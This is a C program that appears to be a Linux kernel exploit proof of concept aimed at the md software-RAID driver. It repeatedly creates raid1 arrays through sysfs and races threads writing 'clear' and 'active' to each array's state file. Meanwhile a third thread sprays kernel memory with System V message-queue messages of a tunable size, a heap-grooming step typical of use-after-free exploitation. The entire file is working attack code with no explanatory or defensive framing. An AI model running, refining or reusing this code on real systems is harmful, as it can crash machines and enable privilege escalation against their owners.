#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sched.h>
#include <time.h>

static char g_path[256];
static volatile int g_run = 1;
static volatile int g_go = 0;
static int g_qid;

static int wr1(const char *p, const char *v)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0) return -1;
    ssize_t n = write(fd, v, strlen(v));
    close(fd);
    return n < 0 ? -1 : 0;
}

static void *clear_worker(void *a)
{
    (void)a;
    int fd = -1;
    char cur[256];
    int last = -1;
    while (g_run) {
        if (fd < 0 || strcmp(cur, g_path)) {
            if (fd >= 0) close(fd);
            snprintf(cur, sizeof(cur), "%s", g_path);
            fd = open(cur, O_WRONLY);
            if (fd < 0) { sched_yield(); continue; }
        }
        if (!g_go) { sched_yield(); continue; }
        write(fd, "clear", 5);
    }
    if (fd >= 0) close(fd);
    return NULL;
}

static void *active_worker(void *a)
{
    (void)a;
    int fd = -1;
    char cur[256];
    while (g_run) {
        if (fd < 0 || strcmp(cur, g_path)) {
            if (fd >= 0) close(fd);
            snprintf(cur, sizeof(cur), "%s", g_path);
            fd = open(cur, O_WRONLY);
            if (fd < 0) { sched_yield(); continue; }
        }
        if (!g_go) { sched_yield(); continue; }
        write(fd, "active", 6);
    }
    if (fd >= 0) close(fd);
    return NULL;
}

static void *spray_worker(void *a)
{
    int sz = *(int *)a;
    char *msg = malloc(sz + 64);
    if (!msg) return NULL;
    while (g_run) {
        if (!g_go) { sched_yield(); continue; }
        for (int i = 0; i < 200; i++) {
            *(long *)msg = 0;
            memset(msg + 8, 0, sz);
            if (msgsnd(g_qid, msg, sz, IPC_NOWAIT) < 0)
                break;
        }
        char tmp[8192];
        while (msgrcv(g_qid, tmp, sizeof(tmp), 0, IPC_NOWAIT | MSG_NOERROR) >= 0)
            ;
    }
    free(msg);
    return NULL;
}

int main(int argc, char **argv)
{
    int rounds = argc > 1 ? atoi(argv[1]) : 40;
    int sz = argc > 2 ? atoi(argv[2]) : 960;

    printf("V8 uid=%d rounds=%d msgsz=%d\n", getuid(), rounds, sz);
    fflush(stdout);

    g_qid = msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
    if (g_qid < 0) { printf("msgget %d\n", errno); return 1; }

    pthread_t tc, ta, ts;
    pthread_create(&tc, NULL, clear_worker, NULL);
    pthread_create(&ta, NULL, active_worker, NULL);
    pthread_create(&ts, NULL, spray_worker, &sz);

    int ok = 0;

    for (int i = 0; i < rounds; i++) {
        char name[32], p[192];
        snprintf(name, sizeof(name), "md%d", i);

        g_go = 0;
        int e = 0;
        int fd = open("/sys/module/md_mod/parameters/new_array", O_WRONLY);
        if (fd < 0) { printf("NEWARR open %d\n", errno); break; }
        if (write(fd, name, strlen(name)) < 0) { close(fd); continue; }
        close(fd);
        ok++;

        snprintf(p, sizeof(p), "/sys/block/%s/md/metadata_version", name);
        wr1(p, "none");
        snprintf(p, sizeof(p), "/sys/block/%s/md/level", name);
        wr1(p, "raid1");
        snprintf(p, sizeof(p), "/sys/block/%s/md/raid_disks", name);
        wr1(p, "1");
        snprintf(p, sizeof(p), "/sys/block/%s/md/new_dev", name);
        wr1(p, "1:0");
        snprintf(p, sizeof(p), "/sys/block/%s/md/dev-ram0/slot", name);
        wr1(p, "0");
        snprintf(p, sizeof(p), "/sys/block/%s/md/dev-ram0/state", name);
        wr1(p, "in_sync");

        snprintf(g_path, sizeof(g_path), "/sys/block/%s/md/array_state", name);

        snprintf(p, sizeof(p), "/sys/block/%s/md/array_state", name);
        wr1(p, "active");

        g_go = 1;
        for (int t = 0; t < 40; t++)
            usleep(1000);
        g_go = 0;

        printf("r=%d ok=%d\n", i, ok);
        fflush(stdout);
        usleep(20000);
    }

    g_run = 0;
    g_go = 1;
    usleep(100000);
    printf("V8FINAL created=%d\n", ok);
    printf("V8 done\n");
    fflush(stdout);
    return 0;
}